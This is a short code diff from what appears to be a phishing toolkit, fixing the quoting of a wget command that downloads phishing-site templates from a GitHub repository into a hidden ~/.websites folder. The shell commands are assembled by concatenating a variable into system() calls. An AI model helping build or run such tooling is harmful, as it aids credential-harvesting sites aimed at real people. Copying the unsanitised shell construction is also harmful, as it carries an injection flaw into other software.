@@ -702,7 +702,7 @@ def requirements(folder,mask):
             internet()
             sprint("\n"+info+"Downloading required files.....\n")
             system("rm -rf site.zip")
-            system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/phishingsites/'+folder+'.zip' -O 'site.zip'")
+            system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/phishingsites/"+folder+".zip -O site.zip")
             if not os.path.exists(root+"/.websites"):
                 system("cd $HOME && mkdir .websites")
             system("cd $HOME/.websites && mkdir "+folder)
